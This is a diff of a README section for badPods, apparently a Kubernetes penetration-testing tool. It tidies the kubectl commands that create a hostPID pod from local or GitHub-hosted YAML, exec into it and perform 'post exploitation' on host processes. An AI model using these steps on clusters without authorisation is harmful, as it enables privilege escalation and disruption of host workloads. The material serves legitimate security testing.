@@ -33,16 +33,17 @@ Allowed Specification | What's the worst that can happen? | How?
  Each resource in the `yamls` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. Each subdirectory has it's own usage information which includes tailored post-exploitation ideas and steps.  
 
 ### Create a pod
+
 ```bash
 # Option 1: Create pod from local yaml 
-kubectl apply -f pod-hostpid-only.yaml  [-n namespace] 
+kubectl apply -f pod-hostpid-only.yaml   
 # Option 2: Create pod from github hosted yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostpid-only.yaml [-n namespace] 
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-hostpid-only.yaml  
 ```
 
 ### Exec into pod 
 ```bash 
-kubectl exec -it pod-hostpid-only [-n namespace] -- bash
+kubectl exec -it pod-hostpid-only  -- bash
 ```
 ### Post exploitation
 ```bash
@@ -57,4 +58,6 @@ root     2123072  0.0  0.0   3732  2868 ?        Ss   21:00   0:00 /bin/bash -c 
 # Also, you can also kill any process, but don't do that in production :)
 ```
 # Remove pod
-kubectl  delete -f pod-hostpid-only.yaml [-n namespace]
+```
+kubectl  delete -f pod-hostpid-only.yaml 
+```
